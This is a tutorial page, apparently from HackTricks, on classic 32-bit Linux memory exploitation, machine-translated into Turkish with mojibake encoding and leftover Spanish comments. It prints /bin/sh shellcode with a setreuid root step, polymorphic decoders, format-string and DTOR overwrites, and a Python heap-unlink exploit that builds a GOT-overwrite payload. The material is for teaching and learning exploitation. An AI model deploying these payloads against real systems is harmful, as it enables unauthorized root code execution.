# Linux Exploiting (Temel) (SPA)

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan ileri seviyeye Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'da **takip edin**.
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

## **2.SHELLCODE**

Kernel kesmelerini gÃ¶rÃ¼ntÃ¼le: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep â€œ\_\_NR\_â€

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(â€œ/bin/shâ€, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; eax'Ä± temizle\
xor ebx, ebx ; ebx = 0 Ã§Ã¼nkÃ¼ geÃ§irilecek bir argÃ¼man yok\
mov al, 0x01 ; eax = 1 â€”> \_\_NR\_exit 1\
int 0x80 ; Syscall'Ä± Ã§alÄ±ÅŸtÄ±r

**nasm -f elf assembly.asm** â€”> Bir .o dosyasÄ± dÃ¶ndÃ¼rÃ¼r\
**ld assembly.o -o shellcodeout** â€”> DerlenmiÅŸ kodu iÃ§eren yÃ¼rÃ¼tÃ¼lebilir dosyayÄ± verir ve **objdump** ile opcode'larÄ± Ã§Ä±karabiliriz\
**objdump -d -Mintel ./shellcodeout** â€”> GerÃ§ekten shellcodemuz olduÄŸunu ve opcode'larÄ± Ã§Ä±karmak iÃ§in

**Shellcodenin Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± kontrol etmek**
```
char shellcode[] = â€œ\x31\xc0\x31\xdb\xb0\x01\xcd\x80â€

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
Para doÄŸru sistem Ã§aÄŸrÄ±larÄ±nÄ±n yapÄ±ldÄ±ÄŸÄ±nÄ± gÃ¶rmek iÃ§in Ã¶nceki programÄ± derlemek ve sistem Ã§aÄŸrÄ±larÄ±nÄ±n **strace ./DERLENMÄ°Å_PROGRAM** iÃ§inde gÃ¶rÃ¼nmesi gerekir.

Shellcode'larÄ± oluÅŸtururken bir hile yapÄ±labilir. Ä°lk talimat bir Ã§aÄŸrÄ±ya bir sÄ±Ã§rama yapmaktÄ±r. Ã‡aÄŸrÄ±, orijinal kodu Ã§aÄŸÄ±rÄ±r ve aynÄ± zamanda EIP'yi yÄ±ÄŸÄ±na yerleÅŸtirir. Ã‡aÄŸrÄ± talimatÄ±ndan sonra ihtiyacÄ±mÄ±z olan dizeyi yerleÅŸtirdik, bu nedenle bu EIP ile dizeyi iÅŸaretleyebilir ve aynÄ± zamanda kodu devam ettirebiliriz.

Ã–R **HÄ°LE (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al Ãºltimo call
popl                %esi                                       ; Guardamos en ese la direcciÃ³n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=â€œ/bin/shâ€
leal                 0x8(%esi), %ecx      ; arg[2] = {â€œ/bin/shâ€, â€œ0â€}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(â€œ/bin/shâ€, [â€œ/bin/shâ€, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruciÃ³n
.string             \â€/bin/sh\â€                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
**Stack Kullanarak EJ(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; â€œ\0â€
push               dword 0x68732f2f ; â€œ//shâ€
push               dword 0x6e69622f; â€œ/binâ€
mov                ebx, esp                     ; arg1 = â€œ/bin//sh\0â€
push               eax                             ; Null -> args[1]
push               ebx                             ; â€œ/bin/sh\0â€ -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(â€œ/bin/shâ€, args[â€œ/bin/shâ€, â€œNULLâ€], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutÃ³ fabs
â€¦
```
**Yumurta AvcÄ±sÄ±:**

Bir iÅŸleme iliÅŸkilendirilmiÅŸ bellek sayfalarÄ±nÄ± dolaÅŸan ve orada saklanan shellcode'u arayan kÃ¼Ã§Ã¼k bir kod parÃ§asÄ±dÄ±r (shellcode'da yer alan bir imza arar). Kod enjekte etmek iÃ§in sadece kÃ¼Ã§Ã¼k bir alan olduÄŸu durumlarda faydalÄ±dÄ±r.

**Polimorfik Shellcode'lar**

KÃ¼Ã§Ã¼k kodlarla ÅŸifrelenmiÅŸ kabuklardÄ±r ve bunlarÄ± Ã§Ã¶zen ve ona atlayan kÃ¼Ã§Ã¼k kodlar iÃ§erirler, Call-Pop hilesini kullanarak ÅŸifrelenmiÅŸ bir Ã¶rnek ÅŸÃ¶yle olabilir:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerÃ¡)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;AquÃ­ va el shellcode
```
## **5. Ek YÃ¶ntemler**

**Ret2Ret**

EIP'ye bir adres yerleÅŸtirilemediÄŸinde (EIP'nin 0xbf iÃ§ermediÄŸi kontrol edilir) veya shellcode'un konumu hesaplanamadÄ±ÄŸÄ±nda kullanÄ±ÅŸlÄ±dÄ±r. Ancak, zafiyetli iÅŸlev bir parametre kabul eder (shellcode buraya gidecektir).

Bu ÅŸekilde, EIP'yi bir **ret** adresine deÄŸiÅŸtirerek, bir sonraki adres yÃ¼klenecektir (bu, iÅŸlevin ilk argÃ¼manÄ±nÄ±n adresidir). Yani, shellcode yÃ¼klenecektir.

SaldÄ±rÄ± ÅŸu ÅŸekilde olacaktÄ±r: SHELLCODE + Dolgu (EIP'ye kadar) + **\&ret** (yÄ±ÄŸÄ±na geÃ§irilen adres, geÃ§irilen parametre adresine iÅŸaret ettiÄŸi iÃ§in yÄ±ÄŸÄ±nÄ±n sonraki baytlarÄ± shellcode'un baÅŸlangÄ±cÄ±na iÅŸaret eder)

**strncpy** gibi iÅŸlevler, tamamlandÄ±ÄŸÄ±nda yÄ±ÄŸÄ±nda saklanan shellcode'un adresini kaldÄ±rarak bu tekniÄŸi imkansÄ±z hale getirir gibi gÃ¶rÃ¼nmektedir. Yani, iÅŸlev iÃ§in argÃ¼man olarak geÃ§irilen adres (shellcode'u saklayan adres) 0x00 ile deÄŸiÅŸtirilir, bu nedenle ikinci **ret** Ã§aÄŸrÄ±sÄ±nda 0x00 ile karÅŸÄ±laÅŸÄ±lÄ±r ve program Ã§Ã¶ker.

**Murat TekniÄŸi**

Linux'ta tÃ¼m programlar 0xbfffffff'den baÅŸlayarak eÅŸlenir.

Linux'ta yeni bir iÅŸlem yÄ±ÄŸÄ±nÄ± nasÄ±l oluÅŸturulduÄŸunu gÃ¶z Ã¶nÃ¼nde bulundurarak, bir programÄ±n yalnÄ±zca shellcode'un bulunduÄŸu bir ortamda baÅŸlatÄ±lmasÄ±nÄ± saÄŸlayacak bir saldÄ±rÄ± geliÅŸtirilebilir. Bu durumda, shellcode'un bulunduÄŸu ortam deÄŸiÅŸkeninin adresi ÅŸu ÅŸekilde hesaplanabilir: addr = 0xbfffffff - 4 - strlen(FULL_EXECUTABLE_NAME) - strlen(shellcode)

Bu ÅŸekilde, shellcode'un bulunduÄŸu deÄŸiÅŸkenin adresi kolayca elde edilir.

Bu, execle iÅŸlevinin istenilen ortam deÄŸiÅŸkenlerini yalnÄ±zca oluÅŸturmasÄ±na izin verdiÄŸi iÃ§in mÃ¼mkÃ¼ndÃ¼r.

**ESP'ye Atlama: Windows TarzÄ±**

ESP her zaman yÄ±ÄŸÄ±nÄ±n baÅŸlangÄ±cÄ±na iÅŸaret ettiÄŸi iÃ§in, bu teknik EIP'yi bir **jmp esp** veya **call esp** Ã§aÄŸrÄ±sÄ±nÄ±n adresiyle deÄŸiÅŸtirerek gerÃ§ekleÅŸtirilir. BÃ¶ylece, shellcode, EIP'nin Ã¼zerine yazÄ±lmasÄ±ndan sonra kaydedilir Ã§Ã¼nkÃ¼ **ret** iÅŸlemi gerÃ§ekleÅŸtikten sonra ESP, hemen ardÄ±ndan shellcode'un saklandÄ±ÄŸÄ± yere iÅŸaret edecek ÅŸekilde bulunacaktÄ±r.

Windows veya Linux'ta ASLR etkin deÄŸilse, paylaÅŸÄ±lan bir nesnede depolanan **jmp esp** veya **call esp** Ã§aÄŸrÄ±larÄ± yapÄ±labilir. ASLR etkinse, zafiyetli program iÃ§inde arama yapÄ±labilir.

AyrÄ±ca, shellcode'u yÄ±ÄŸÄ±nÄ±n ortasÄ±na yerleÅŸtirmek yerine EIP'nin bozulmasÄ±ndan sonra shellcode'u yerleÅŸtirebilmek, iÅŸlevin ortasÄ±nda yÃ¼rÃ¼tÃ¼len push veya pop talimatlarÄ±nÄ±n shellcode'a dokunmamasÄ±nÄ± saÄŸlar (bu durum, iÅŸlevin yÄ±ÄŸÄ±nÄ±n ortasÄ±na yerleÅŸtirilmesi durumunda meydana gelebilir).

Benzer ÅŸekilde, bir iÅŸlevin shellcode'un saklandÄ±ÄŸÄ± adresi dÃ¶ndÃ¼rdÃ¼ÄŸÃ¼nÃ¼ biliyorsak, **call eax** veya **jmp eax (ret2eax)** Ã§aÄŸrÄ±larÄ± yapÄ±labilir.

**TamsayÄ± TaÅŸmalarÄ±**

Bu tÃ¼r taÅŸmalar, bir deÄŸiÅŸkenin geÃ§irilen kadar bÃ¼yÃ¼k bir sayÄ±yÄ± desteklemeye hazÄ±r olmadÄ±ÄŸÄ±nda meydana gelir, muhtemelen iÅŸaretli ve iÅŸaretsiz deÄŸiÅŸkenler arasÄ±ndaki karÄ±ÅŸÄ±klÄ±ktan kaynaklanabilir, Ã¶rneÄŸin:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
Ã–nceki Ã¶rnekte programÄ±n 2 parametre beklediÄŸini gÃ¶rebiliriz. Ä°lk parametre takip eden dizenin uzunluÄŸu ve ikinci parametre dizedir.

EÄŸer ilk parametre olarak negatif bir sayÄ± verirsek, len < 256 Ã§Ä±kacaktÄ±r ve bu filtreyi geÃ§eceÄŸiz, ayrÄ±ca strlen(buffer) da l'den daha kÃ¼Ã§Ã¼k olacaktÄ±r, Ã§Ã¼nkÃ¼ l unsigned int tÃ¼rÃ¼ndedir ve Ã§ok bÃ¼yÃ¼k olacaktÄ±r.

Bu tÃ¼r aÅŸÄ±rÄ± taÅŸmalar, programÄ±n iÅŸlemine bir ÅŸeyler yazmayÄ± hedeflemez, ancak diÄŸer zayÄ±f noktalarÄ± sÃ¶mÃ¼rmek iÃ§in kÃ¶tÃ¼ tasarlanmÄ±ÅŸ filtreleri aÅŸmayÄ± amaÃ§lar.

**DeÄŸiÅŸkenlerin BaÅŸlatÄ±lmamasÄ±**

BaÅŸlatÄ±lmamÄ±ÅŸ bir deÄŸiÅŸkenin alabileceÄŸi deÄŸer bilinmez ve bunu gÃ¶zlemlemek ilginÃ§ olabilir. Ã–nceki iÅŸlevdeki bir deÄŸiÅŸkenin deÄŸerini alabilir ve bu deÄŸiÅŸken saldÄ±rgan tarafÄ±ndan kontrol edilebilir.

##

###

###

###

### **.fini\_array**

Temelde, bu programÄ±n bitmeden Ã¶nce Ã§aÄŸrÄ±lacak iÅŸlevlerin bulunduÄŸu bir yapÄ±dÄ±r. Bu, **shellcode'unuza bir adrese atlayarak Ã§aÄŸÄ±rabiliyorsanÄ±z** veya format dizesini ikinci kez **sÃ¶mÃ¼rmek iÃ§in tekrar main'e dÃ¶nmek gerektiÄŸinde** ilginÃ§ olabilir.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
### **Ä°Ã§erikleri DÃ¶kÃ¼mlemek Ä°Ã§in Format Dizileri**

Bir format dizesi ayrÄ±ca programÄ±n belleÄŸinden iÃ§erikleri dÃ¶kmek iÃ§in de kÃ¶tÃ¼ye kullanÄ±labilir.\
Ã–rneÄŸin, aÅŸaÄŸÄ±daki durumda, bir bayraÄŸa iÅŸaret eden bir yerel deÄŸiÅŸken bulunmaktadÄ±r. EÄŸer bellekte bayraÄŸa iÅŸaret eden iÅŸaretÃ§inin nerede olduÄŸunu bulursanÄ±z, `printf`'in o adresi eriÅŸmesini saÄŸlayabilir ve bayraÄŸÄ± yazdÄ±rabilirsiniz:

Yani, bayrak **0xffffcf4c** adresindedir

![](<../../.gitbook/assets/image (618) (2).png>)

Ve sÄ±zÄ±ntÄ±dan, bayraÄŸa iÅŸaret eden iÅŸaretÃ§inin **8.** parametrede olduÄŸunu gÃ¶rebilirsiniz:

![](<../../.gitbook/assets/image (623).png>)

Bu nedenle, **8. parametreye eriÅŸerek** bayraÄŸÄ± alabilirsiniz:

![](<../../.gitbook/assets/image (624).png>)

Ã–nceki saldÄ±rÄ±yÄ± takip ederek ve iÃ§erik sÄ±zdÄ±rabileceÄŸinizi fark ederek, `printf`'e **iÅŸaretÃ§ileri ayarlayabilir** ve **yÃ¼rÃ¼tÃ¼lebilir** olan bÃ¶lÃ¼me **eriÅŸebilir** ve onu **tamamen dÃ¶kebilirsiniz**!

### **DTOR**

{% hint style="danger" %}
GÃ¼nÃ¼mÃ¼zde bir dtor bÃ¶lÃ¼mÃ¼ olan bir ikili bulmak Ã§ok **garip**.
{% endhint %}

YÄ±kÄ±cÄ±lar, programÄ±n **sona ermeden Ã¶nce yÃ¼rÃ¼tÃ¼len iÅŸlevlerdir**.\
EÄŸer bir **adresi** bir **shellcode**'a **yazmayÄ±** baÅŸarÄ±rsanÄ±z, bu, programÄ±n sona ermeden Ã¶nce **yÃ¼rÃ¼tÃ¼lecektir**.\
Bu bÃ¶lÃ¼mÃ¼n adresini alÄ±n:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep â€œ__DTORâ€
```
Genellikle **DTOR** bÃ¶lÃ¼mÃ¼nÃ¼ `ffffffff` ve `00000000` deÄŸerleri **arasÄ±nda** bulacaksÄ±nÄ±z. Bu yÃ¼zden sadece bu deÄŸerleri gÃ¶rÃ¼yorsanÄ±z, bu, **herhangi bir fonksiyonun kaydedilmediÄŸi anlamÄ±na gelir**. Bu yÃ¼zden **`00000000`**'Ä± **Ã¼zerine yazarak** shellcode'Ä± **Ã§alÄ±ÅŸtÄ±rmak iÃ§in adresi** yazÄ±n.

### **Format Strings to Buffer Overflows**

**sprintf**, bir **deÄŸiÅŸkene** biÃ§imlendirilmiÅŸ bir dize **taÅŸÄ±r**. Bu nedenle, bir dizenin biÃ§imlendirmesini **kullanarak**, iÃ§eriÄŸin kopyalandÄ±ÄŸÄ± deÄŸiÅŸkende bir **tampon taÅŸmasÄ±na neden olabilirsiniz**.\
Ã–rneÄŸin, yÃ¼k `%.44xAAAA`, deÄŸiÅŸkene **44B+"AAAA" yazacaktÄ±r**, bu da bir tampon taÅŸmasÄ±na neden olabilir.

### **\_\_atexit YapÄ±larÄ±**

{% hint style="danger" %}
BugÃ¼nlerde bunu **saldÄ±rmak Ã§ok garip**.
{% endhint %}

**`atexit()`**, **parametre olarak baÅŸka fonksiyonlarÄ±n** geÃ§irildiÄŸi bir iÅŸlevdir. Bu **fonksiyonlar**, bir **`exit()`** veya **main**'in **dÃ¶nÃ¼ÅŸÃ¼ sÄ±rasÄ±nda yÃ¼rÃ¼tÃ¼lecek**tir.\
Ã–rneÄŸin, bu **fonksiyonlardan herhangi birinin adresini** Ã¶rneÄŸin bir shellcode'a iÅŸaret etmek iÃ§in **deÄŸiÅŸtirebilirseniz**, **iÅŸlemi kontrol edersiniz**, ancak bu ÅŸu anda daha karmaÅŸÄ±ktÄ±r.\
Åu anda **yÃ¼rÃ¼tÃ¼lecek fonksiyonlarÄ±n adresleri** birkaÃ§ yapÄ± arkasÄ±nda gizlenmiÅŸtir ve sonunda iÅŸaret ettiÄŸi adresler fonksiyonlarÄ±n adresleri deÄŸil, **XOR ile ÅŸifrelenmiÅŸ ve rastgele bir anahtarla kaydÄ±rÄ±lmÄ±ÅŸtÄ±r**. Bu nedenle, bu saldÄ±rÄ± vektÃ¶rÃ¼ ÅŸu anda **en azÄ±ndan x86** ve **x64\_86** Ã¼zerinde Ã§ok kullanÄ±ÅŸlÄ± deÄŸildir.\
**Åifreleme iÅŸlevi** **`PTR_MANGLE`**'dÄ±r. m68k, mips32, mips64, aarch64, arm, hppa gibi **diÄŸer mimariler**, girdi olarak aldÄ±ÄŸÄ± gibi **ÅŸifrelemeyi uygulamaz**. Bu nedenle, bu mimariler bu vektÃ¶r tarafÄ±ndan saldÄ±rÄ±ya uÄŸrayabilir.

### **setjmp() & longjmp()**

{% hint style="danger" %}
BugÃ¼nlerde bunu **saldÄ±rmak Ã§ok garip**.
{% endhint %}

**`Setjmp()`**, **baÄŸlamÄ±** (kayÄ±tlarÄ±) **kaydetmeye izin verir**\
**`longjmp()`**, **baÄŸlamÄ± geri yÃ¼klemeye izin verir**.\
**Kaydedilen kayÄ±tlar**: `EBX, ESI, EDI, ESP, EIP, EBP`\
Olan ÅŸudur ki EIP ve ESP **`PTR_MANGLE`** iÅŸlevi tarafÄ±ndan geÃ§irilir, bu nedenle **bu saldÄ±rÄ±ya duyarlÄ± mimariler yukarÄ±dakiyle aynÄ±dÄ±r**.\
Hata kurtarma veya kesmeler iÃ§in kullanÄ±ÅŸlÄ±dÄ±r.\
Ancak okuduÄŸum kadarÄ±yla, diÄŸer kayÄ±tlarÄ±n korunmadÄ±ÄŸÄ±nÄ±, bu nedenle `call ebx`, `call esi` veya `call edi` iÃ§eren iÅŸlevin iÃ§indeyken kontrolun alÄ±nabileceÄŸini belirtir. Veya EBP'yi deÄŸiÅŸtirerek ESP'yi deÄŸiÅŸtirebilirsiniz.

**VTable ve VPTR in C++**

Her sÄ±nÄ±fÄ±n bir **Vtable**'Ä± vardÄ±r, bu bir **yÃ¶ntemler dizisidir**.

Her bir **sÄ±nÄ±fÄ±n nesnesi**, sÄ±nÄ±fÄ±nÄ±n bir **dizisine iÅŸaret eden** bir **VPtr**'ye sahiptir. VPtr, her nesnenin baÅŸlÄ±ÄŸÄ±nÄ±n bir parÃ§asÄ±dÄ±r, bu nedenle **VPtr'nin Ã¼zerine yazÄ±lmasÄ± baÅŸarÄ±lÄ± olursa**, bir iÅŸlevi yÃ¼rÃ¼tmek iÃ§in bir dummy yÃ¶nteme iÅŸaret edecek ÅŸekilde **deÄŸiÅŸtirilebilir**.

## **Ã–nleyici ve KaÃ§Ä±nma Ã–nlemleri**

###

**Libsafe DeÄŸiÅŸtirme**

Åununla etkinleÅŸtirilir: LD\_PRELOAD=/lib/libsafe.so.2\
veya\
â€œ/lib/libsave.so.2â€ > /etc/ld.so.preload

BazÄ± gÃ¼vensiz iÅŸlev Ã§aÄŸrÄ±larÄ±nÄ± gÃ¼venli iÅŸlevlerle deÄŸiÅŸtirir. Standart deÄŸildir. (yalnÄ±zca x86 iÃ§in, -fomit-frame-pointer ile derlenmemiÅŸ, statik derlemeler iÃ§in geÃ§erli deÄŸil ve LD\_PRELOAD setuid olan ikili dosyalarda Ã§alÄ±ÅŸmaz).

**ASCII Armored Adres AlanÄ±**

PaylaÅŸÄ±lan kÃ¼tÃ¼phaneleri 0x00000000 ile 0x00ffffff arasÄ±nda yÃ¼klemek, her zaman bir 0x00 baytÄ±nÄ±n olmasÄ±nÄ± saÄŸlar. Bununla birlikte, bu neredeyse hiÃ§bir saldÄ±rÄ±yÄ± durdurmaz, Ã¶zellikle little endian'da.

**ret2plt**

strcpy@plt iÅŸlevini (plt'den) Ã§aÄŸÄ±rmak ve GOT girdisinin baÅŸÄ±na iÅŸlemek ve Ã§aÄŸrÄ±lmak istenen iÅŸlevin (system()) ilk baytÄ±nÄ± kopyalamak iÃ§in bir ROP gerÃ§ekleÅŸtirmek anlamÄ±na gelir. ArdÄ±ndan aynÄ±sÄ±nÄ± GOT+1'e iÅŸaret ederek system()'Ä±n 2. baytÄ±nÄ± kopyalarsÄ±nÄ±z... Sonunda GOT'da saklanan adres Ã§aÄŸrÄ±lÄ±r ve bu system() olacaktÄ±r.

**chroot() ile Kafesler**

debootstrap -arch=i386 hardy /home/user â€”> Belirli bir alt dizin altÄ±na temel bir sistem yÃ¼kler

Bir yÃ¶netici, bu kafeslerden birinden Ã§Ä±kmak iÃ§in ÅŸunu yapabilir: mkdir foo; chroot foo; cd ..

**Kod EnstrÃ¼mantasyonu**

Valgrind â€”> HatalarÄ± arar\
Memcheck\
RAD (Return Address Defender)\
Insure++
**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<Iâ€, 0xfffffff0) #Interesa que el bit que indica que el anterior trozo estÃ¡ libre estÃ© a 1**

**fake\_size = pack("\<Iâ€, 0xfffffffc) #-4, para que piense que el â€œsizeâ€ del 3Âº trozo estÃ¡ 4bytes detrÃ¡s (apunta a prev\_size) pues es ahÃ­ donde mira si el 2Âº trozo estÃ¡ libre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #En el payload al principio le vamos a poner 8bytes de relleno**

**got\_free = pack("\<I", 0x08048300 - 12) #DirecciÃ³n de free() en la plt-12 (serÃ¡ la direcciÃ³n que se sobrescrita para que se lanza la shellcode la 2Âº vez que se llame a free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Como se dijo el payload comienza con 8 bytes de relleno porque sÃ­**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Se modifica el 2Âº trozo, el got\_free apunta a donde vamos a guardar la direccion addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando en sentido inverso (wargame)**

Kontrol ettiÄŸimiz 3 ardÄ±ÅŸÄ±k parÃ§ayÄ± ters sÄ±rayla serbest bÄ±rakÄ±yoruz.

Bu durumda:

C parÃ§asÄ±na shellcode yerleÅŸtirilir

A parÃ§asÄ±nÄ±, A parÃ§asÄ±nÄ±n boÅŸ olduÄŸunu dÃ¼ÅŸÃ¼nmesi iÃ§in PREV\_INUSE bitini devre dÄ±ÅŸÄ± bÄ±rakacak ÅŸekilde B'yi Ã¼zerine yazmak iÃ§in kullanÄ±rÄ±z.

AyrÄ±ca, baÅŸlÄ±k B'deki boyutu -4 olarak ayarlamak iÃ§in Ã¼zerine yazÄ±lÄ±r.

Bu durumda, program "a" nÄ±n boÅŸ olduÄŸunu ve bir baÄŸda olduÄŸunu dÃ¼ÅŸÃ¼necek, bu yÃ¼zden unlink() iÅŸlevini Ã§aÄŸÄ±racak. Ancak, Ã§Ã¼nkÃ¼ baÅŸlÄ±k PREV\_SIZE -4 olarak ayarlanmÄ±ÅŸtÄ±r. "a" parÃ§asÄ±nÄ±n aslÄ±nda b+4'te baÅŸladÄ±ÄŸÄ±nÄ± dÃ¼ÅŸÃ¼necek. Yani, b+4'te baÅŸlayan bir parÃ§ayÄ± unlink() yapacak, bu nedenle b+12'de "fd" iÅŸaretÃ§isi ve b+16'da "bk" iÅŸaretÃ§isi olacak.

Bu ÅŸekilde, bk'ya shellcode adresini ve fd'ye "puts()" iÅŸlevinin adresini -12 olarak yerleÅŸtirirsek, payloadumuzu elde ederiz.

**Frontlink TekniÄŸi**

Bir ÅŸey serbest bÄ±rakÄ±ldÄ±ÄŸÄ±nda ve yanÄ±ndaki parÃ§alar boÅŸ deÄŸilse, unlink() Ã§aÄŸrÄ±lmaz, doÄŸrudan frontlink() Ã§aÄŸrÄ±lÄ±r.

SaldÄ±rÄ±ya uÄŸrayan malloc asla serbest bÄ±rakÄ±lmazsa yararlÄ± bir zayÄ±flÄ±k.

Gereksinimler:

Veri giriÅŸi iÅŸleviyle taÅŸÄ±nabilir bir tampon

Bu tampona bitiÅŸik serbest bÄ±rakÄ±lacak ve baÅŸlÄ±k fd alanÄ± taÅŸÄ±nma tamponu tarafÄ±ndan deÄŸiÅŸtirilecek bir tampon

512'den bÃ¼yÃ¼k ancak Ã¶nceki tamponu taÅŸÄ±mak iÃ§in kÃ¼Ã§Ã¼k bir boyutta bir tampon

Bu adÄ±mdan Ã¶nce bu tamponun prev\_size'Ä±nÄ± Ã¼zerine yazmaya izin veren bir tampon

Bu ÅŸekilde, kontrolsÃ¼z iki malloc Ã¼zerine yazarak ve sadece birinin serbest bÄ±rakÄ±ldÄ±ÄŸÄ± ancak diÄŸerinin serbest bÄ±rakÄ±lmadÄ±ÄŸÄ± bir saldÄ±rÄ± yapabiliriz.

**Ã‡ift free() ZayÄ±flÄ±ÄŸÄ±**

AynÄ± iÅŸaretÃ§iyle iki kez free() Ã§aÄŸrÄ±lÄ±rsa, aynÄ± adrese iÅŸaret eden iki baÄŸ oluÅŸur.

Birini tekrar kullanmak istendiÄŸinde sorunsuz bir ÅŸekilde atanÄ±r. DiÄŸerini kullanmak istendiÄŸinde, Ã¶nceki rezervasyonun yazacaÄŸÄ± verilerle "fd" ve "bk" iÅŸaretÃ§ileri yanÄ±ltÄ±lÄ±r.

**Free() SonrasÄ±**

Ã–nceden serbest bÄ±rakÄ±lan bir iÅŸaretÃ§i kontrolsÃ¼z bir ÅŸekilde yeniden kullanÄ±lÄ±r.

## **8 Heap TaÅŸmalarÄ±: GeliÅŸmiÅŸ SaldÄ±rÄ±lar**

Unlink() ve FrontLink() teknikleri unlink() iÅŸlevi deÄŸiÅŸtirilerek kaldÄ±rÄ±ldÄ±.

**The house of mind**

Kodun keyfi olarak yÃ¼rÃ¼tÃ¼lmesi iÃ§in sadece bir free() Ã§aÄŸrÄ±sÄ± gereklidir. Ã–nceki bir tampon tarafÄ±ndan taÅŸÄ±nabilir ve serbest bÄ±rakÄ±labilir bir ikinci tampon aranÄ±r.

Bir free() Ã§aÄŸrÄ±sÄ±, public\_fREe(mem) iÅŸlevini Ã§aÄŸÄ±rÄ±r, bu iÅŸlev:

mstate ar\_ptr;

mchunkptr p;

â€¦

p = mem2chunk(mes); â€”> Bir parÃ§anÄ±n baÅŸladÄ±ÄŸÄ± adresi iÅŸaret eden bir iÅŸaretÃ§i dÃ¶ndÃ¼rÃ¼r (mem-8)

â€¦

ar\_ptr = arena\_for_chunk(p); â€”> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

â€¦

\_int\_free(ar\_ptr, mem);

}

\[1] kÄ±smÄ±nda boyut alanÄ± NON\_MAIN_ARENA bitini kontrol eder, bu biti deÄŸiÅŸtirerek kontrolÃ¼ true dÃ¶ndÃ¼rebilir ve heap\_for\_ptr() iÅŸlevini Ã§alÄ±ÅŸtÄ±rabilir, bu iÅŸlev "mem" Ã¼zerinde bir and iÅŸlemi yaparak en az anlamlÄ± 2.5 baytÄ± sÄ±fÄ±rlar (Ã¶rneÄŸin 0x0804a000 iÃ§in 0x08000000) ve 0x08000000->ar\_ptr adresine eriÅŸir (struct heap\_info gibi).

